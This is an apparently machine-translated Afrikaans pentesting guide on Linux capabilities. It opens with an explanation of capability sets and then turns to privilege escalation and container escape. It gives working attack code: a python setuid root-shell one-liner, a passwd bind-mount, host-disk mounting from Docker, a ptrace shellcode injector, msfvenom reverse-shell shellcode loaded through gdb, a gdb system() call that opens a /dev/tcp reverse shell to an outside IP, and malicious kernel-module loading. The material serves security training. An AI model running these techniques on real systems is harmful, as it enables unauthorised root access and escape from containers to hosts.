# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities verdeel **root bevoegdhede in kleiner, afsonderlike eenhede**, wat dit moontlik maak dat prosesse 'n substel van bevoegdhede het. Dit minimaliseer die risiko's deur nie volle root bevoegdhede onnodig toe te ken nie.

### Die Probleem:

- Normale gebruikers het beperkte toestemmings, wat take soos die opening van 'n netwerk socket wat root toegang vereis, beïnvloed.

### Bevoegdheidstelle:

1. **Inherited (CapInh)**:

- **Doel**: Bepaal die bevoegdhede wat van die ouer proses oorgedra word.
- **Funksionaliteit**: Wanneer 'n nuwe proses geskep word, erf dit die bevoegdhede van sy ouer in hierdie stel. Nuttig om sekere bevoegdhede oor proses ontstaan te handhaaf.
- **Beperkings**: 'n Proses kan nie bevoegdhede verkry wat sy ouer nie besit het nie.

2. **Effective (CapEff)**:

- **Doel**: Verteenwoordig die werklike bevoegdhede wat 'n proses op enige oomblik gebruik.
- **Funksionaliteit**: Dit is die stel bevoegdhede wat deur die kernel nagegaan word om toestemming vir verskeie operasies te verleen. Vir lêers kan hierdie stel 'n vlag wees wat aandui of die lêer se toegelate bevoegdhede as effektief beskou moet word.
- **Belangrikheid**: Die effektiewe stel is van kardinale belang vir onmiddellike bevoegdheidstoetsing, wat as die aktiewe stel bevoegdhede dien wat 'n proses kan gebruik.

3. **Permitted (CapPrm)**:

- **Doel**: Definieer die maksimum stel bevoegdhede wat 'n proses kan besit.
- **Funksionaliteit**: 'n Proses kan 'n bevoegdheid van die toegelate stel na sy effektiewe stel verhoog, wat dit die vermoë gee om daardie bevoegdheid te gebruik. Dit kan ook bevoegdhede uit sy toegelate stel laat val.
- **Grens**: Dit dien as 'n boonste limiet vir die bevoegdhede wat 'n proses kan hê, wat verseker dat 'n proses nie sy vooraf gedefinieerde bevoegdheidsscope oorskry nie.

4. **Bounding (CapBnd)**:

- **Doel**: Plaas 'n plafon op die bevoegdhede wat 'n proses ooit kan verkry gedurende sy lewensiklus.
- **Funksionaliteit**: Selfs al het 'n proses 'n sekere bevoegdheid in sy erfbare of toegelate stel, kan dit nie daardie bevoegdheid verkry nie tensy dit ook in die begrensde stel is.
- **Gebruiksgval**: Hierdie stel is veral nuttig om 'n proses se potensiaal vir bevoegdheidstoename te beperk, wat 'n ekstra laag van sekuriteit toevoeg.

5. **Ambient (CapAmb)**:
- **Doel**: Laat sekere bevoegdhede toe om oor 'n `execve` stelselsoproep gehandhaaf te word, wat tipies 'n volle reset van die proses se bevoegdhede sou veroorsaak.
- **Funksionaliteit**: Verseker dat nie-SUID programme wat nie geassosieerde lêer bevoegdhede het nie, sekere bevoegdhede kan behou.
- **Beperkings**: Bevoegdhede in hierdie stel is onderhewig aan die beperkings van die erfbare en toegelate stelle, wat verseker dat hulle nie die proses se toegelate bevoegdhede oorskry nie.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Vir verdere inligting, kyk:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Prosesse & Binaries Vermoëns

### Prosesse Vermoëns

Om die vermoëns vir 'n spesifieke proses te sien, gebruik die **status** lêer in die /proc gids. Aangesien dit meer besonderhede verskaf, laat ons dit beperk tot die inligting wat verband hou met Linux vermoëns.\
Let daarop dat vir alle lopende prosesse vermoënsinligting per draad gehandhaaf word, vir binaries in die lêerstelsel word dit in uitgebreide eienskappe gestoor.

Jy kan die vermoëns wat in /usr/include/linux/capability.h gedefinieer is, vind.

Jy kan die vermoëns van die huidige proses vind in `cat /proc/self/status` of deur `capsh --print` te doen en van ander gebruikers in `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Hierdie opdrag behoort 5 lyne op die meeste stelsels te retourneer.

- CapInh = Geërfde vermoëns
- CapPrm = Toegelate vermoëns
- CapEff = Effektiewe vermoëns
- CapBnd = Beperkte stel
- CapAmb = Ambiënte vermoëns stel
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Hierdie hexadesimale getalle maak nie sin nie. Deur die capsh-hulpmiddel te gebruik, kan ons hulle in die vermoënsnaam dekodeer.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Kom ons kyk nou na die **capabilities** wat deur `ping` gebruik word:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Alhoewel dit werk, is daar 'n ander en makliker manier. Om die vermoëns van 'n lopende proses te sien, gebruik eenvoudig die **getpcaps** hulpmiddel gevolg deur sy proses ID (PID). Jy kan ook 'n lys van proses ID's verskaf.
```bash
getpcaps 1234
```
Laat ons hier die vermoëns van `tcpdump` nagaan nadat ons die binêre genoeg vermoëns gegee het (`cap_net_admin` en `cap_net_raw`) om die netwerk te snuffel (_tcpdump loop in proses 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Soos wat jy kan sien, stem die gegewe vermoëns ooreen met die resultate van die 2 maniere om die vermoëns van 'n binêre te verkry.\
Die _getpcaps_ hulpmiddel gebruik die **capget()** stelselskakel om die beskikbare vermoëns vir 'n spesifieke draad te vra. Hierdie stelselskakel benodig slegs die PID om meer inligting te verkry.

### Binêre Vermoëns

Binêre kan vermoëns hê wat gebruik kan word terwyl dit uitgevoer word. Byvoorbeeld, dit is baie algemeen om `ping` binêre met `cap_net_raw` vermoë te vind:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Jy kan **binaries met vermoëns soek** met:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

As ons die CAP*NET_RAW vermoëns vir \_ping* laat val, dan behoort die ping nut nie meer te werk nie.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Behalwe die uitvoer van _capsh_ self, moet die _tcpdump_ opdrag ook 'n fout veroorsaak.

> /bin/bash: /usr/sbin/tcpdump: Operasie nie toegelaat nie

Die fout toon duidelik dat die ping-opdrag nie toegelaat word om 'n ICMP-soket te open nie. Nou weet ons verseker dat dit werk soos verwag.

### Verwyder Vermoëns

Jy kan vermoëns van 'n binêre verwyder met
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Blykbaar **is dit moontlik om vermoëns ook aan gebruikers toe te ken**. Dit beteken waarskynlik dat elke proses wat deur die gebruiker uitgevoer word, die gebruiker se vermoëns sal kan gebruik.\
Gebaseer op [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)en [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)moet 'n paar lêers geconfigureer word om 'n gebruiker sekere vermoëns te gee, maar die een wat die vermoëns aan elke gebruiker toeken, sal wees `/etc/security/capability.conf`.\
Lêer voorbeeld:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Omgewing Vermoëns

Deur die volgende program te kompileer, is dit moontlik om **'n bash-skal te genereer binne 'n omgewing wat vermoëns bied**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Binne die **bash wat deur die gecompileerde omgewing binêre uitgevoer word** is dit moontlik om die **nuwe vermoëns** waar te neem (n 'n gewone gebruiker sal geen vermoë in die "huidige" afdeling hê).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Jy kan **slegs vermoëns byvoeg wat teenwoordig is** in beide die toegelate en die oorerflike stelle.

### Vermoensbewuste/Vermoensdomme binêre

Die **vermoensbewuste binêre sal nie die nuwe vermoëns gebruik nie** wat deur die omgewing gegee word, maar die **vermoensdomme binêre sal dit gebruik** aangesien hulle dit nie sal verwerp nie. Dit maak vermoensdomme binêre kwesbaar binne 'n spesiale omgewing wat vermoëns aan binêre toeken.

## Diensvermoëns

Standaard sal 'n **diens wat as root loop alle vermoëns toegeken hê**, en in sommige gevalle kan dit gevaarlik wees.\
Daarom laat 'n **dienskonfigurasie** lêer jou toe om die **vermoëns** wat jy wil hê dit moet hê, **en** die **gebruiker** wat die diens moet uitvoer, te **specifiseer** om te verhoed dat 'n diens met onnodige voorregte gedraai word:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Vermoëns in Docker Houers

Deur standaard ken Docker 'n paar vermoëns aan die houers toe. Dit is baie maklik om te kyk watter vermoëns dit is deur die volgende opdrag uit te voer:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Vermogens is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte operasies uitgevoer het** (bv. nadat jy chroot opgestel het en aan 'n sokket gebind het). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente oor te dra wat dan as root uitgevoer word.

Jy kan vermogens op programme afdwing met `setcap`, en dit met `getcap` navraag doen:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Die `+ep` beteken jy voeg die vermoë (“-” sou dit verwyder) by as Effektief en Toegelaat.

Om programme in 'n stelsel of gids met vermoëns te identifiseer:
```bash
getcap -r / 2>/dev/null
```
### Exploitasi voorbeel

In die volgende voorbeeld word die binêre `/usr/bin/python2.6` as kwesbaar vir privesc gevind:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Vermoe** wat deur `tcpdump` benodig word om **enige gebruiker toe te laat om pakkette te snuffel**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Die spesiale geval van "leë" vermoëns

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Let daarop dat 'n mens leë vermoëns aan 'n programlêer kan toewys, en dus is dit moontlik om 'n set-user-ID-root program te skep wat die effektiewe en gestoor set-user-ID van die proses wat die program uitvoer na 0 verander, maar geen vermoëns aan daardie proses toeken nie. Of, eenvoudig gestel, as jy 'n binêre het wat:

1. nie deur root besit word nie
2. geen `SUID`/`SGID` bits het nie
3. leë vermoëns stel (bv.: `getcap myelf` gee `myelf =ep` terug)

dan **sal daardie binêre as root loop**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is 'n hoogs kragtige Linux vermoë, dikwels gelykgestel aan 'n naby-root vlak weens sy uitgebreide **administratiewe voorregte**, soos om toestelle te monteer of kernfunksies te manipuleer. Terwyl dit onontbeerlik is vir houers wat hele stelsels simuleer, **veroorzaak `CAP_SYS_ADMIN` beduidende sekuriteitsuitdagings**, veral in gecontaineriseerde omgewings, weens sy potensiaal vir voorregverhoging en stelselskade. Daarom vereis die gebruik daarvan streng sekuriteitsassessering en versigtige bestuur, met 'n sterk voorkeur om hierdie vermoë in toepassingspesifieke houers te laat vaar om die **beginsel van die minste voorreg** na te kom en die aanvaloppervlak te minimaliseer.

**Voorbeeld met binêre**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Met Python kan jy 'n gewysigde _passwd_ lêer bo-op die werklike _passwd_ lêer monteer:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
En laastens **mount** die gewysigde `passwd` lêer op `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
En jy sal in staat wees om **`su` as root** te gebruik met die wagwoord "password".

**Voorbeeld met omgewing (Docker breek uit)**

Jy kan die geaktiveerde vermoëns binne die docker houer nagaan met:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die SYS_ADMIN vermoë geaktiveer is.

- **Mount**

Dit laat die docker-container toe om die **gasheer skyf te monteer en dit vrylik te benader**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Volle toegang**

In die vorige metode het ons daarin geslaag om toegang tot die docker gasheer skyf te verkry.\
In die geval dat jy vind dat die gasheer 'n **ssh** bediener draai, kan jy **n gebruiker binne die docker gasheer** skyf skep en dit via SSH benader:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Dit beteken dat jy die houer kan ontsnap deur 'n shellcode in 'n proses wat binne die gasheer loop, in te spuit.** Om toegang te verkry tot prosesse wat binne die gasheer loop, moet die houer ten minste met **`--pid=host`** gedraai word.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om debugging en stelselaanroep-tracing funksies te gebruik wat deur `ptrace(2)` en kruis-geheue aanroep soos `process_vm_readv(2)` en `process_vm_writev(2)` verskaf word. Alhoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit, indien `CAP_SYS_PTRACE` geaktiveer word sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`, die stelselsekuriteit aansienlik ondermyn. Spesifiek kan dit uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [bewyse van konsep (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Voorbeeld met binêre (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Voorbeeld met binêre (gdb)**

`gdb` met `ptrace` vermoë:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
```markdown
Skep 'n shellcode met msfvenom om in geheue te inspuit via gdb
```
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug 'n root-proses met gdb en kopieer-plak die voorheen gegenereerde gdb-lyne:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Voorbeeld met omgewing (Docker breekpunt) - Nog 'n gdb Misbruik**

As **GDB** geïnstalleer is (of jy kan dit installeer met `apk add gdb` of `apt install gdb` byvoorbeeld) kan jy **'n proses vanaf die gasheer debugeer** en dit laat die `system` funksie aanroep. (Hierdie tegniek vereis ook die vermoë `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
U sal nie die uitvoer van die uitgevoerde opdrag kan sien nie, maar dit sal deur daardie proses uitgevoer word (so kry 'n rev shell).

> [!WARNING]
> As u die fout "No symbol "system" in current context." kry, kyk na die vorige voorbeeld wat 'n shellcode in 'n program via gdb laai.

**Voorbeeld met omgewing (Docker breakout) - Shellcode Injeksie**

U kan die geaktiveerde vermoëns binne die docker-container nagaan met:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** wat in die **host** loop `ps -eaf`

1. Kry die **architecture** `uname -m`
2. Vind 'n **shellcode** vir die architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Vind 'n **program** om die **shellcode** in 'n proses se geheue te **inject** ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** die **shellcode** binne die program en **compile** dit `gcc inject.c -o inject`
5. **Inject** dit en gryp jou **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bemagtig 'n proses om **kernel modules te laai en te verwyder (`init_module(2)`, `finit_module(2)` en `delete_module(2)` stelsels oproepe)**, wat direkte toegang tot die kern se kern operasies bied. Hierdie vermoë bied kritieke sekuriteitsrisiko's, aangesien dit privilige-eskalasie en totale stelselskompromie moontlik maak deur veranderinge aan die kern toe te laat, wat alle Linux-sekuriteitsmeganismes, insluitend Linux Security Modules en houer-isolasie, omseil.
**Dit beteken dat jy** **kernel modules in/uit die kern van die host masjien kan invoeg/verwyder.**

**Voorbeeld met binêre**

In die volgende voorbeeld het die binêre **`python`** hierdie vermoë.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Standaard, **`modprobe`** opdrag kyk vir afhanklikheidslys en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
Om hiervan misbruik te maak, kom ons skep 'n vals **lib/modules** gids:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Dan **kompyleer die kernmodule wat jy hieronder kan vind 2 voorbeelde en kopieer** dit na hierdie gids:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Laastens, voer die nodige python kode uit om hierdie kernel module te laai:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Voorbeeld 2 met binêre**

In die volgende voorbeeld het die binêre **`kmod`** hierdie vermoë.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
